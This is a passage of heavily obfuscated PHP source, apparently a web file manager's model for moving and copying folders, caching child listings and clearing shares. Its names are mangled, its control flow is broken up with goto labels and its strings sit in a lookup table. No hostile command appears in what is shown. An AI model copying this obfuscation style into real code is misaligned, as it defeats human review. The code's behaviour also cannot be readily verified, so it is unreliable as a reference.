$C¼Ï–Û¸¦[$C×ÍÏŸ”å[369]]; } return $Aƒ¤¨÷Í; } private function _childrenMatch($CˆØ•¯Ãö–, $dÌ»Ôœè¬æ, $C¼ÌÀ½”ç‚) { goto bË°Ğ„ğ‚¡; bË°Ğ„ğ‚¡: $BÑù„ˆÈ¼Ÿ =& $_SERVER[”Ì÷ñ­î¸]; $C–„ŞÀùµØ = $C¼ÌÀ½”ç‚[$BÑù„ˆÈ¼Ÿ[459]]; $a‰éÄöµá = $this->parentLevelArray($dÌ»Ôœè¬æ[$BÑù„ˆÈ¼Ÿ[459]]); goto DÌæç•Õæ§; DÌæç•Õæ§: foreach ($a‰éÄöµá as $F£¥ÚÉù) { if (isset($CˆØ•¯Ãö–[$F£¥ÚÉù])) { $C–„ŞÀùµØ .= $CˆØ•¯Ãö–[$F£¥ÚÉù] . $BÑù„ˆÈ¼Ÿ[517]; } } $C–„ŞÀùµØ = rtrim($C–„ŞÀùµØ, $BÑù„ˆÈ¼Ÿ[47]) . $BÑù„ˆÈ¼Ÿ[47]; $C½·Ù¬Áì“ = $this->parentLevelArray($C–„ŞÀùµØ); goto FˆÓÛ–‰ê; FˆÓÛ–‰ê: $Cù¬¼ùªâ¥ = $C½·Ù¬Áì“[count($C½·Ù¬Áì“) - 1]; return array($BÑù„ˆÈ¼Ÿ[461] => $Cù¬¼ùªâ¥, $BÑù„ˆÈ¼Ÿ[459] => $C–„ŞÀùµØ); goto FÇÑ…¸ö“Ì; FÇÑ…¸ö“Ì: } private function _makeItemData($Fòãóë‰¨í, $C¥©‡…—ïÙ, $D•ùö¹Œ²¦) { $bÉ¦—ÆŠ„å =& $_SERVER[”Ì÷ñ­î¸]; $f™òéöâÂ¯ = array($bÉ¦—ÆŠ„å[518] => $Fòãóë‰¨í[$bÉ¦—ÆŠ„å[370]], $bÉ¦—ÆŠ„å[386] => $D•ùö¹Œ²¦, $bÉ¦—ÆŠ„å[519] => $Fòãóë‰¨í[$bÉ¦—ÆŠ„å[372]], $bÉ¦—ÆŠ„å[420] => $Fòãóë‰¨í[$bÉ¦—ÆŠ„å[419]], $bÉ¦—ÆŠ„å[520] => $Fòãóë‰¨í[$bÉ¦—ÆŠ„å[77]], $bÉ¦—ÆŠ„å[521] => $C¥©‡…—ïÙ[$bÉ¦—ÆŠ„å[371]], $bÉ¦—ÆŠ„å[522] => $C¥©‡…—ïÙ[$bÉ¦—ÆŠ„å[456]], $bÉ¦—ÆŠ„å[523] => USER_ID, $bÉ¦—ÆŠ„å[524] => USER_ID, $bÉ¦—ÆŠ„å[368] => $C¥©‡…—ïÙ[$bÉ¦—ÆŠ„å[369]], $bÉ¦—ÆŠ„å[525] => $C¥©‡…—ïÙ[$bÉ¦—ÆŠ„å[459]] . $C¥©‡…—ïÙ[$bÉ¦—ÆŠ„å[369]] . $bÉ¦—ÆŠ„å[47], $bÉ¦—ÆŠ„å[396] => 0, $bÉ¦—ÆŠ„å[526] => $bÉ¦—ÆŠ„å[33]); return $f™òéöâÂ¯; } private function _copyApplyMeta($C¬±‡Ôòœ, &$c‘õ£ƒŸ˜) { $EĞÃ¹¡îĞ =& $_SERVER[”Ì÷ñ­î¸]; $aÓ£´µÆ»Í = $C¬±‡Ôòœ[$EĞÃ¹¡îĞ[369]]; $c¿Ğ„‡¥ÏŒ = $C¬±‡Ôòœ[$EĞÃ¹¡îĞ[28]]; if (!isset($C¬±‡Ôòœ[$EĞÃ¹¡îĞ[527]]) || !$C¬±‡Ôòœ[$EĞÃ¹¡îĞ[527]] || $C¬±‡Ôòœ[$EĞÃ¹¡îĞ[527]] == $EĞÃ¹¡îĞ[468]) { $c‘õ£ƒŸ˜[$EĞÃ¹¡îĞ[503]][] = array($EĞÃ¹¡îĞ[369], $aÓ£´µÆ»Í, $EĞÃ¹¡îĞ[527], short_id($aÓ£´µÆ»Í)); } if (Input::check($c¿Ğ„‡¥ÏŒ, $EĞÃ¹¡îĞ[528])) { $c‘õ£ƒŸ˜[$EĞÃ¹¡îĞ[502]][] = array($EĞÃ¹¡îĞ[369] => $aÓ£´µÆ»Í, $EĞÃ¹¡îĞ[89] => $EĞÃ¹¡îĞ[416], $EĞÃ¹¡îĞ[359] => str_replace($EĞÃ¹¡îĞ[50], $EĞÃ¹¡îĞ[33], Pinyin::encode($c¿Ğ„‡¥ÏŒ))); $c‘õ£ƒŸ˜[$EĞÃ¹¡îĞ[502]][] = array($EĞÃ¹¡îĞ[369] => $aÓ£´µÆ»Í, $EĞÃ¹¡îĞ[89] => $EĞÃ¹¡îĞ[415], $EĞÃ¹¡îĞ[359] => Pinyin::encode($c¿Ğ„‡¥ÏŒ, $EĞÃ¹¡îĞ[529])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($dŠÈ¶¶æ•ù) { goto aÉƒ¤±İÑÄ; EÆÔÉÒ…êÉ: $dºÔá£Ûñˆ = array_to_keyvalue($dºÔá£Ûñˆ, $d»§çÔß[369]); foreach ($dºÔá£Ûñˆ as $bà—Œ¹ÕÓ) { $b…„™®ÒÈˆ = $bà—Œ¹ÕÓ[$d»§çÔß[461]]; $dŠÈ¶¶æ•ù = $bà—Œ¹ÕÓ[$d»§çÔß[369]]; if (!isset($this->_childrenListCache[$dŠÈ¶¶æ•ù]) && $bà—Œ¹ÕÓ[$d»§çÔß[370]] == $d»§çÔß[83]) { $this->_childrenListCache[$dŠÈ¶¶æ•ù] = array(); } if (!isset($this->_childrenListCache[$b…„™®ÒÈˆ])) { $this->_childrenListCache[$b…„™®ÒÈˆ] = array(); } $this->_childrenListCache[$b…„™®ÒÈˆ][$dŠÈ¶¶æ•ù] = $bà—Œ¹ÕÓ; $this->_childrenItemCache[$dŠÈ¶¶æ•ù] = $bà—Œ¹ÕÓ; } goto Aáå÷òİ‰ø; aÉƒ¤±İÑÄ: $d»§çÔß =& $_SERVER[”Ì÷ñ­î¸]; $e‰¯çŠ¿¬« = $this->sourceInfo($dŠÈ¶¶æ•ù); $bÃˆÌ‰“ïÇ = $d»§çÔß[530]; goto F“ß¢²²•; F“ß¢²²•: $dÄÑíæ¶È› = array($d»§çÔß[459] => array($d»§çÔß[483], $e‰¯çŠ¿¬«[$d»§çÔß[459]] . $dŠÈ¶¶æ•ù . $d»§çÔß[484]), $d»§çÔß[397] => $this->targetIsDelete); $dºÔá£Ûñˆ = $this->field($bÃˆÌ‰“ïÇ)->where($dÄÑíæ¶È›)->select(); if (!$dºÔá£Ûñˆ) { return; } goto EÆÔÉÒ…êÉ; Aáå÷òİ‰ø: } private function _childrenListAll($dÁÊ¦øÚ¤Í, &$eøä¹¸ƒ¸ö) { $A¤Ä«æõº’ =& $_SERVER[”Ì÷ñ­î¸]; if (!isset($this->_childrenListCache[$dÁÊ¦øÚ¤Í])) { return; } $F–¸õÃÉ—¨ = $this->_childrenListCache[$dÁÊ¦øÚ¤Í]; foreach ($F–¸õÃÉ—¨ as $CÃ†¼­Úª‚ => $bÙ«Ù‘¼Í“) { $eøä¹¸ƒ¸ö[$CÃ†¼­Úª‚] = $bÙ«Ù‘¼Í“; if ($bÙ«Ù‘¼Í“[$A¤Ä«æõº’[370]] == $A¤Ä«æõº’[83]) { $this->_childrenListAll($CÃ†¼­Úª‚, $eøä¹¸ƒ¸ö); } } } private function sourceInfoCache($fßóŒäá˜) { if (isset($this->_childrenItemCache[$fßóŒäá˜])) { return $this->_childrenItemCache[$fßóŒäá˜]; } return $this->sourceInfo($fßóŒäá˜); } private function _childrenList($CåÈ¾§Ï™¨) { if (isset($this->_childrenListCache[$CåÈ¾§Ï™¨])) { return $this->_childrenListCache[$CåÈ¾§Ï™¨]; } return $this->_childrenListSelect($CåÈ¾§Ï™¨); } private function _childrenListSelect($fĞğóÇÇ‰Ü) { goto E¬ˆ¯ƒ¯¤; aÄ¹—Õ‚Î‚: $A˜‹Ôêù¡ = $A˜‹Ôêù¡ ? $A˜‹Ôêù¡ : array(); $D‡ß—Ô©Å¥ = array_to_keyvalue($A˜‹Ôêù¡, $f‹„“æÖ·ª[369]); $this->_childrenListCache[$fĞğóÇÇ‰Ü] = $D‡ß—Ô©Å¥; goto AÇÈÌ£¾¼‘; E¬ˆ¯ƒ¯¤: $f‹„“æÖ·ª =& $_SERVER[”Ì÷ñ­î¸]; $e’í¯‰õª” = array($f‹„“æÖ·ª[461] => $fĞğóÇÇ‰Ü, $f‹„“æÖ·ª[397] => $this->targetIsDelete); $A˜‹Ôêù¡ = $this->where($e’í¯‰õª”)->select(); goto aÄ¹—Õ‚Î‚; AÇÈÌ£¾¼‘: foreach ($D‡ß—Ô©Å¥ as $fĞğóÇÇ‰Ü => $CÃÚœ÷ÃÓª) { $this->_childrenItemCache[$fĞğóÇÇ‰Ü] = $CÃÚœ÷ÃÓª; } return $D‡ß—Ô©Å¥; goto bÆ×‰ÚÛ¢; bÆ×‰ÚÛ¢: } private function fileNameExistCache($eƒÎîñÉÃĞ, $f’®§ÁÃ‚) { $B¡¼…Ğœˆ¾ =& $_SERVER[”Ì÷ñ­î¸]; $f’®§ÁÃ‚ = strtolower($f’®§ÁÃ‚); $eÎ†•Ô‰¿ = $this->_childrenList($eƒÎîñÉÃĞ); foreach ($eÎ†•Ô‰¿ as $aïŠ‰˜İ´Ù) { if ($f’®§ÁÃ‚ == strtolower($aïŠ‰˜İ´Ù[$B¡¼…Ğœˆ¾[28]])) { return $aïŠ‰˜İ´Ù[$B¡¼…Ğœˆ¾[369]]; } } return !1; } private function fileNameAutoCache($fÄóÖâ–¢Î, $böŠÚ¸›‡…, $dóÓÍº‚½Ú, $dŸ„›ÁƒĞ×) { $b³¡¥¾Ğ©È =& $_SERVER[”Ì÷ñ­î¸]; $dÛ÷áš‚× = $this->_childrenList($fÄóÖâ–¢Î); $aßõ†Ï‚³ = array_to_keyvalue($dÛ÷áš‚×, $b³¡¥¾Ğ©È[33], $b³¡¥¾Ğ©È[28]); return $this->fileNameAutoGet($aßõ†Ï‚³, $böŠÚ¸›‡…, $dóÓÍº‚½Ú, $dŸ„›ÁƒĞ×); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($E·ªóƒ¸š, $c‹š‰õ•£, $C‚ç•¥Ñ = REPEAT_REPLACE, $Eƒ®íƒ©“¡ = '') { goto fæéÆÂËÄ; E¸©æ¨œ¯: $fŸ¹á§ÁÌ‡ = $this->_move($E·ªóƒ¸š, $c‹š‰õ•£, $C‚ç•¥Ñ, $Cª×¯ãâØ£, $Eƒ®íƒ©“¡); $this->sourceCacheClear(); if ($BÑìÉğÂ¹[$B²Ü•ëáí›[370]] == $B²Ü•ëáí›[83] && $BØ¾Í¶íç°) { $this->folderSizeResetChildren($fŸ¹á§ÁÌ‡); } goto Eæ—â£«Å’; C¿×©¢ˆ®Ô: $Fºòâ×”ˆ¦ = $Eƒ®íƒ©“¡ ? $Eƒ®íƒ©“¡ : $BÑìÉğÂ¹[$B²Ü•ëáí›[28]]; $this->lockMoveStart($E·ªóƒ¸š); $this->lockWriteStart($c‹š‰õ•£, $Fºòâ×”ˆ¦); goto Cˆ³¼ŸÅÆ¸; d¯ŒÚÁîÊ: Hook::trigger($B²Ü•ëáí›[531], $Dİø®¦Ï×); $this->targetIsDelete = intval($BÑìÉğÂ¹[$B²Ü•ëáí›[397]]); if ($BÑìÉğÂ¹[$B²Ü•ëáí›[461]] == $c‹š‰õ•£ && $Eƒ®íƒ©“¡ != $BÑìÉğÂ¹[$B²Ü•ëáí›[28]]) { $cˆŞ¼¥Ë = $this->fileNameExist($c‹š‰õ•£, $Eƒ®íƒ©“¡); if ($cˆŞ¼¥Ë && $BÑìÉğÂ¹[$B²Ü•ëáí›[370]] == $B²Ü•ëáí›[468]) { goto D©ĞÍŒ”ßÍ; DÀ©ÖÜâ: return $cˆŞ¼¥Ë; goto E¡¨œßÂêñ; D©ĞÍŒ”ßÍ: $bÆ‚›¶¿¡¾ = $this->sourceInfo($cˆŞ¼¥Ë); $c¾Ñå½¥— = $this->fileHistory($bÆ‚›¶¿¡¾, $BÑìÉğÂ¹[$B²Ü•ëáí›[419]], $BÑìÉğÂ¹[$B²Ü•ëáí›[77]]); if (!$c¾Ñå½¥—) { Model($B²Ü•ëáí›[422])->remove($BÑìÉğÂ¹[$B²Ü•ëáí›[419]]); } goto AË…ªÆ²º§; AË…ªÆ²º§: $this->removeNow($E·ªóƒ¸š, !1); $this->folderSizeReset($c‹š‰õ•£); Hook::trigger($B²Ü•ëáí›[532], $Dİø®¦Ï×); goto DÀ©ÖÜâ; E¡¨œßÂêñ: } } goto C¿×©¢ˆ®Ô; f­Æè­Á‚: $this->lockWriteEnd($c‹š‰õ•£, $Fºòâ×”ˆ¦); $this->folderSizeReset($BÑìÉğÂ¹[$B²Ü•ëáí›[461]]); $this->folderSizeReset($c‹š‰õ•£); goto E¹õ‘ÍÀÚø; e„¥°»¿¤: Model($B²Ü•ëáí›[505])->eventMove($E·ªóƒ¸š, $BÑìÉğÂ¹[$B²Ü•ëáí›[461]], $c‹š‰õ•£); Hook::trigger($B²Ü•ëáí›[532], $Dİø®¦Ï×); return $fŸ¹á§ÁÌ‡; goto EÓÃÅâá„÷; c‘ÅºÆÊÀà: $Dİø®¦Ï× = $this->pathInfoMore($E·ªóƒ¸š); if ($this->isParentOf($E·ªóƒ¸š, $c‹š‰õ•£)) { return !1; } if (!$BÑìÉğÂ¹ || !$DÜô¸æª± || $DÜô¸æª±[$B²Ü•ëáí›[370]] != $B²Ü•ëáí›[83]) { return !1; } goto d¯ŒÚÁîÊ; Cˆ³¼ŸÅÆ¸: $Cª×¯ãâØ£ = array($B²Ü•ëáí›[501] => array(), $B²Ü•ëáí›[533] => !1); $this->clearShare($E·ªóƒ¸š, $c‹š‰õ•£); $BØ¾Í¶íç° = $this->fileNameExistCache($c‹š‰õ•£, $BÑìÉğÂ¹[$B²Ü•ëáí›[28]]); goto E¸©æ¨œ¯; Eæ—â£«Å’: Model($B²Ü•ëáí›[167])->linkAdd($Cª×¯ãâØ£[$B²Ü•ëáí›[501]]); if ($BØ¾Í¶íç° && $Cª×¯ãâØ£[$B²Ü•ëáí›[533]]) { $this->removeNow($E·ªóƒ¸š, !1); } $this->lockMoveEnd($E·ªóƒ¸š); goto f­Æè­Á‚; E¹õ‘ÍÀÚø: $fñ†àŠ…·™ = array($BÑìÉğÂ¹[$B²Ü•ëáí›[461]], $c‹š‰õ•£); if ($BÑìÉğÂ¹[$B²Ü•ëáí›[370]] == $B²Ü•ëáí›[83]) { $fñ†àŠ…·™[] = $E·ªóƒ¸š; } $this->updateModifyTime($fñ†àŠ…·™); goto e„¥°»¿¤; fæéÆÂËÄ: $B²Ü•ëáí› =& $_SERVER[”Ì÷ñ­î¸]; $BÑìÉğÂ¹ = $this->sourceInfo($E·ªóƒ¸š); $DÜô¸æª± = $this->sourceInfo($c‹š‰õ•£); goto c‘ÅºÆÊÀà; EÓÃÅâá„÷: } private function _move($bˆšò–†çš, $A‡‚ÔÂ‡–è, $F®µ‚¶áÎ, &$E°¸ôÍ¤ºá, $cÛ‚¡‰ä¨Ø = '') { goto eß«¸´Œ; eÇº‰Ä˜¥: $fùåˆŒ§›± = $cÛ‚¡‰ä¨Ø ? $cÛ‚¡‰ä¨Ø : $Bº×çÙâ„ô[$FïÖ°ÕÏ†ì[28]]; $b¨Â‘«éÛä = $this->fileNameExistCache($A‡‚ÔÂ‡–è, $fùåˆŒ§›±); $this->lockMoveStart($bˆšò–†çš); goto Dê§ìÍ±®ù; b‹®Ô·ÛËé: return $c½¼ìÍºÅğ; goto BˆùàÉÙº…; Dê§ìÍ±®ù: $this->lockWriteStart($A‡‚ÔÂ‡–è, $fùåˆŒ§›±); if (!$b¨Â‘«éÛä) { return $this->_moveForce($bˆšò–†çš, $A‡‚ÔÂ‡–è, $fùåˆŒ§›±); } $c½¼ìÍºÅğ = $b¨Â‘«éÛä; goto bÔ«Û¢ø®; eß«¸´Œ: $FïÖ°ÕÏ†ì =& $_SERVER[”Ì÷ñ­î¸]; $Bº×çÙâ„ô = $this->sourceInfo($bˆšò–†çš); $Aí»¡Æêğ = $Bº×çÙâ„ô[$FïÖ°ÕÏ†ì[370]] == $FïÖ°ÕÏ†ì[83]; goto eÇº‰Ä˜¥; bÔ«Û¢ø®: $FÉ‰¯¹°íã = !1; if ($Aí»¡Æêğ) { if ($F®µ‚¶áÎ == REPEAT_RENAME_FOLDER) { $fùåˆŒ§›± = $this->fileNameAuto($A‡‚ÔÂ‡–è, $fùåˆŒ§›±, $F®µ‚¶áÎ, $Aí»¡Æêğ); $c½¼ìÍºÅğ = $this->_moveForce($bˆšò–†çš, $A‡‚ÔÂ‡–è, $fùåˆŒ§›±); } else { if ($F®µ‚¶áÎ == REPEAT_RENAME_FOLDER) { $F®µ‚¶áÎ = REPEAT_RENAME; } $c§à›¤§ = $this->_childrenListSelect($bˆšò–†çš); foreach ($c§à›¤§ as $eèß©œñ‚£) { $this->_move($eèß©œñ‚£[$FïÖ°ÕÏ†ì[369]], $b¨Â‘«éÛä, $F®µ‚¶áÎ, $E°¸ôÍ¤ºá); } $FÉ‰¯¹°íã = !0; } } else { if ($F®µ‚¶áÎ == REPEAT_SKIP) { $FÉ‰¯¹°íã = !0; } else { if ($F®µ‚¶áÎ == REPEAT_RENAME || $F®µ‚¶áÎ == REPEAT_RENAME_FOLDER) { $fùåˆŒ§›± = $this->fileNameAuto($A‡‚ÔÂ‡–è, $fùåˆŒ§›±, $F®µ‚¶áÎ, $Aí»¡Æêğ); $c½¼ìÍºÅğ = $this->_moveForce($bˆšò–†çš, $A‡‚ÔÂ‡–è, $fùåˆŒ§›±); } else { if ($F®µ‚¶áÎ == REPEAT_REPLACE) { $eòáÉ¡£ÖÙ = $this->sourceInfoCache($b¨Â‘«éÛä); $aµÖÛäçáÕ = $this->fileHistory($eòáÉ¡£ÖÙ, $Bº×çÙâ„ô[$FïÖ°ÕÏ†ì[419]], $Bº×çÙâ„ô[$FïÖ°ÕÏ†ì[77]]); if ($aµÖÛäçáÕ) { $E°¸ôÍ¤ºá[$FïÖ°ÕÏ†ì[501]][] = $Bº×çÙâ„ô[$FïÖ°ÕÏ†ì[419]]; } else { $FÉ‰¯¹°íã = !0; } } } } } if ($FÉ‰¯¹°íã && !$E°¸ôÍ¤ºá[$FïÖ°ÕÏ†ì[533]]) { $E°¸ôÍ¤ºá[$FïÖ°ÕÏ†ì[533]] = !0; } goto b‹®Ô·ÛËé; BˆùàÉÙº…: } private function _moveForce($dæİº¥Í»Ê, $Fš¦Ìè•œî, $CÍˆŸ¶â¸Õ) { goto CÎÌèÛØ÷; DÜ¸‹‹°•: $cî»êÏÄÑõ = $DèÀÜÓÌù·[$CÆ­è†ÃÙ…[370]] == $CÆ­è†ÃÙ…[83]; $A¹œÜ‹Ã„ = array($CÆ­è†ÃÙ…[368] => $Bìœ“ì­¼¥[$CÆ­è†ÃÙ…[369]], $CÆ­è†ÃÙ…[525] => $Bìœ“ì­¼¥[$CÆ­è†ÃÙ…[459]] . $Bìœ“ì­¼¥[$CÆ­è†ÃÙ…[369]] . $CÆ­è†ÃÙ…[47], $CÆ­è†ÃÙ…[521] => $Bìœ“ì­¼¥[$CÆ­è†ÃÙ…[371]], $CÆ­è†ÃÙ…[522] => $Bìœ“ì­¼¥[$CÆ­è†ÃÙ…[456]], $CÆ­è†ÃÙ…[524] => USER_ID, $CÆ­è†ÃÙ…[386] => $CÍˆŸ¶â¸Õ); $fğ“ÀƒØñŠ = $DèÀÜÓÌù·[$CÆ­è†ÃÙ…[371]] == SourceModel::TYPE_GROUP && $Bìœ“ì­¼¥[$CÆ­è†ÃÙ…[371]] == SourceModel::TYPE_GROUP && $DèÀÜÓÌù·[$CÆ­è†ÃÙ…[456]] == $Bìœ“ì­¼¥[$CÆ­è†ÃÙ…[456]]; goto C°†£„£ˆã; fõˆêğÇ¿: if ($cî»êÏÄÑõ) { $EÕ½â¡±½ = array($CÆ­è†ÃÙ…[525] => array($CÆ­è†ÃÙ…[483], $DèÀÜÓÌù·[$CÆ­è†ÃÙ…[459]] . $DèÀÜÓÌù·[$CÆ­è†ÃÙ…[369]] . $CÆ­è†ÃÙ…[484])); $d¥‚‰§·½¿ = $DèÀÜÓÌù·[$CÆ­è†ÃÙ…[459]] . $DèÀÜÓÌù·[$CÆ­è†ÃÙ…[369]] . $CÆ­è†ÃÙ…[47]; $d¦‡äîİñ = $Bìœ“ì­¼¥[$CÆ­è†ÃÙ…[459]] . $Bìœ“ì­¼¥[$CÆ­è†ÃÙ…[369]] . $CÆ­è†ÃÙ…[47] . $DèÀÜÓÌù·[$CÆ­è†ÃÙ…[369]] . $CÆ­è†ÃÙ…[47]; $b³º‹áˆ¡ = array($CÆ­è†ÃÙ…[525] => array($CÆ­è†ÃÙ…[534], "\162\145\x70\154\x61\143\145\50\x70\x61\x72\x65\x6e\x74\x4c\145\x76\x65\x6c\x2c\47{$d¥‚‰§·½¿}\47\x2c\47{$d¦‡äîİñ}\x27\51"), $CÆ­è†ÃÙ…[521] => $Bìœ“ì­¼¥[$CÆ­è†ÃÙ…[371]], $CÆ­è†ÃÙ…[522] => $Bìœ“ì­¼¥[$CÆ­è†ÃÙ…[456]]); if ($fÚ©¡Ú‹´™) { $b³º‹áˆ¡[$CÆ­è†ÃÙ…[396]] = 0; } $this->where($EÕ½â¡±½)->data($b³º‹áˆ¡)->save(); } $this->where(array($CÆ­è†ÃÙ…[383] => $dæİº¥Í»Ê))->data($A¹œÜ‹Ã„)->save(); return $dæİº¥Í»Ê; goto bÏ‡•àê½ì; C°†£„£ˆã: if (!$fğ“ÀƒØñŠ) { Model($CÆ­è†ÃÙ…[454])->authClear($dæİº¥Í»Ê); } $fÚ©¡Ú‹´™ = $DèÀÜÓÌù·[$CÆ­è†ÃÙ…[397]] == $CÆ­è†ÃÙ…[83] && $Bìœ“ì­¼¥[$CÆ­è†ÃÙ…[397]] != $CÆ­è†ÃÙ…[83]; if ($fÚ©¡Ú‹´™) { $A¹œÜ‹Ã„[$CÆ­è†ÃÙ…[396]] = 0; } goto fõˆêğÇ¿; CÎÌèÛØ÷: $CÆ­è†ÃÙ… =& $_SERVER[”Ì÷ñ­î¸]; $DèÀÜÓÌù· = $this->sourceInfo($dæİº¥Í»Ê); $Bìœ“ì­¼¥ = $this->sourceInfo($Fš¦Ìè•œî); goto DÜ¸‹‹°•; bÏ‡•àê½ì: } private function clearShare($fïóÓñ›Ü‚, $E­³ÕÈ‡æ÷) { goto bóŠ‡éèò; Bò “„ˆÔä: if (!$EİÙò×ŠÚ”) { return; } $bÆºÓ·¸¡ = array($Aª‹áèãô[369] => array($Aª‹áèãô[7], $EİÙò×ŠÚ”), $Aª‹áèãô[448] => 1); $cØË©ŠôÓÃ = Model($Aª‹áèãô[536])->field($Aª‹áèãô[441])->where($bÆºÓ·¸¡)->select(); goto bò­çÅÔøÔ; bò­çÅÔøÔ: if (!$cØË©ŠôÓÃ) { return; } $cØË©ŠôÓÃ = array_to_keyvalue($cØË©ŠôÓÃ, $Aª‹áèãô[33], $Aª‹áèãô[441]); $bÆºÓ·¸¡ = array($Aª‹áèãô[441] => array($Aª‹áèãô[7], $cØË©ŠôÓÃ)); goto FñÜ×‚µ¬©; bóŠ‡éèò: $Aª‹áèãô =& $_SERVER[”Ì÷ñ­î¸]; $FİÃæ®äç› = $this->sourceInfo($fïóÓñ›Ü‚); $DóÁğ˜£Ó = $this->sourceInfo($E­³ÕÈ‡æ÷); goto bßàÏ¤¯¢ã; FñÜ×‚µ¬©: Model($Aª‹áèãô[536])->where($bÆºÓ·¸¡)->save(array($Aª‹áèãô[448] => 0)); Model($Aª‹áèãô[537])->where($bÆºÓ·¸¡)->delete(); goto F˜ÒÌšµ°Å; bßàÏ¤¯¢ã: if ($FİÃæ®äç›[$Aª‹áèãô[456]] == $DóÁğ˜£Ó[$Aª‹áèãô[456]] && $FİÃæ®äç›[$Aª‹áèãô[371]] == $Aª‹áèãô[535]) { return; } $bÆºÓ·¸¡ = array($Aª‹áèãô[459] => array($Aª‹áèãô[483], $FİÃæ®äç›[$Aª‹áèãô[459]] . $fïóÓñ›Ü‚ . $Aª‹áèãô[484])); $EİÙò×ŠÚ” = $this->field($Aª‹áèãô[383])->where($bÆºÓ·¸¡)->getField($Aª‹áèãô[369], !0); goto Bò “„ˆÔä; F˜ÒÌšµ°Å: } public function copyFolderFromIO($B¨šÔØÑùİ, $b¨í×¦ã¹Ú, $a˜òµÙ‚¨, $cÒÖœ™ÒÛ, $båœ«ØÍ†ì, $Dœö“ÌŒ“ = false) { goto Bâµ£óÜÙŒ; c¿Û™ñƒ¶õ: Hook::trigger($d´µèÛ­—[540]); if ($cƒÚ­Æ¥œ) { $this->folderSizeResetChildren($cƒÚ­Æ¥œ); } $this->_childrenListClear(); goto AËÅ–¨Œõ; D÷¿ÁÑ…¿: $A‘¢÷Ò¬‚¥ = $this->fileNameExist($a˜òµÙ‚¨, $fêƒóŠ¥ôò); $cƒÚ­Æ¥œ = $this->mkdir($a˜òµÙ‚¨, $fêƒóŠ¥ôò, $cÒÖœ™ÒÛ); if (!$A‘¢÷Ò¬‚¥ || $cÒÖœ™ÒÛ == REPEAT_RENAME_FOLDER) { $cÒÖœ™ÒÛ = !1; } goto CŒ‚•ŠïìÇ; CŒ‚•ŠïìÇ: if ($A‘¢÷Ò¬‚¥) { $this->_childrenAllMake($A‘¢÷Ò¬‚¥); } Hook::trigger($d´µèÛ­—[539]); $this->_copyChildTo($B¨šÔØÑùİ, $b¨í×¦ã¹Ú, $cƒÚ­Æ¥œ, $cÒÖœ™ÒÛ, $D±åíÜ­¡º, $båœ«ØÍ†ì); goto c¿Û™ñƒ¶õ; EšÔãØ×î: Model($d´µèÛ­—[422])->linkAdd($D±åíÜ­¡º[$d´µèÛ­—[501]]); Model($d´µèÛ­—[422])->remove($D±åíÜ­¡º[$d´µèÛ­—[538]]); $this->folderSizeReset($a˜òµÙ‚¨); goto cÒÌÕˆ‘; cÒÌÕˆ‘: $this->updateModifyTime($a˜òµÙ‚¨); return $cƒÚ­Æ¥œ; goto B¾à¶Ìëªğ; AËÅ–¨Œõ: Model($d´µèÛ­—[504])->addAll($D±åíÜ­¡º[$d´µèÛ­—[502]], array(), !0); Model($d´µèÛ­—[505])->eventCopy($cƒÚ­Æ¥œ); $this->saveAll($D±åíÜ­¡º[$d´µèÛ­—[503]]); goto EšÔãØ×î; Bâµ£óÜÙŒ: $d´µèÛ­— =& $_SERVER[”Ì÷ñ­î¸]; $D±åíÜ­¡º = array($d´µèÛ­—[502] => array(), $d´µèÛ­—[503] => array(), $d´µèÛ­—[501] => array(), $d´µèÛ­—[538] => array()); $fêƒóŠ¥ôò = $Dœö“ÌŒ“ ? $Dœö“ÌŒ“ : $B¨šÔØÑùİ->getPathName($B¨šÔØÑùİ->pathThis($b¨í×¦ã¹Ú)); goto D÷¿ÁÑ…¿; B¾à¶Ìëªğ: } private function _copyChildTo($e é¤„ˆññ, $C‚ØæË‹ĞÓ, $FÆœßÁôˆß, $cšìæß÷É›, &$bŞ•îİÍ©, $f‚ì…Öã) { goto EåãÁ‡Õ«š; EåãÁ‡Õ«š: $AÅ±å‘–Î± =& $_SERVER[”Ì÷ñ­î¸]; $Aæ××„‰åÌ = $this->sourceInfoCache($FÆœßÁôˆß); $dÆ­¶¬“Ø = $e é¤„ˆññ->listPath($C‚ØæË‹ĞÓ, !1, !0); goto b´ÏË¢Ğ¤; b´ÏË¢Ğ¤: $C¤à®“¸ÑÕ = array_merge($dÆ­¶¬“Ø[$AÅ±å‘–Î±[73]], $dÆ­¶¬“Ø[$AÅ±å‘–Î±[74]]); $c·‚Ôéò¸Ø = $this->_addFiles($e é¤„ˆññ, $dÆ­¶¬“Ø[$AÅ±å‘–Î±[73]], $f‚ì…Öã); $b‚°÷å­Â = array(); goto aååÒÈó˜”; f‹·‡ÙÊ™…: $B­Ğ“Ûéóñ = $this->_childrenList($FÆœßÁôˆß); $B­Ğ“Ûéóñ = array_to_keyvalue($B­Ğ“Ûéóñ, $AÅ±å‘–Î±[28]); foreach ($C¤à®“¸ÑÕ as $c‚Ôë†™Ê) { $e†º’¦öˆ = $B­Ğ“Ûéóñ[$c‚Ôë†™Ê[$AÅ±å‘–Î±[28]]]; $BÍ¥ÚÏ­ìõ = $e†º’¦öˆ[$AÅ±å‘–Î±[369]]; $this->_copyApplyMeta($e†º’¦öˆ, $bŞ•îİÍ©); if ($c‚Ôë†™Ê[$AÅ±å‘–Î±[29]] == $AÅ±å‘–Î±[76]) { $c‚Ôë†™Ê[$AÅ±å‘–Î±[75]] = $e é¤„ˆññ->getPathInner($c‚Ôë†™Ê[$AÅ±å‘–Î±[75]]); $this->_copyChildTo($e é¤„ˆññ, $c‚Ôë†™Ê[$AÅ±å‘–Î±[75]], $BÍ¥ÚÏ­ìõ, $cšìæß÷É›, $bŞ•îİÍ©, $f‚ì…Öã); } } goto FŒä£ÈÃƒ‘; aååÒÈó˜”: foreach ($C¤à®“¸ÑÕ as &$c‚Ôë†™Ê) { goto e¶îñ––—±; bÀêÊ¼®ô: if ($cšìæß÷É›) { $Dœ˜‚Æ®™Ú = $this->fileNameExistCache($FÆœßÁôˆß, $c‚Ôë†™Ê[$AÅ±å‘–Î±[28]]); if ($Dœ˜‚Æ®™Ú) { if ($c‚Ôë†™Ê[$AÅ±å‘–Î±[370]] || $cšìæß÷É› == REPEAT_SKIP) { continue; } if ($cšìæß÷É› == REPEAT_REPLACE) { $e†º’¦öˆ = $this->sourceInfoCache($Dœ˜‚Æ®™Ú); $bìÎÛ¶·© = 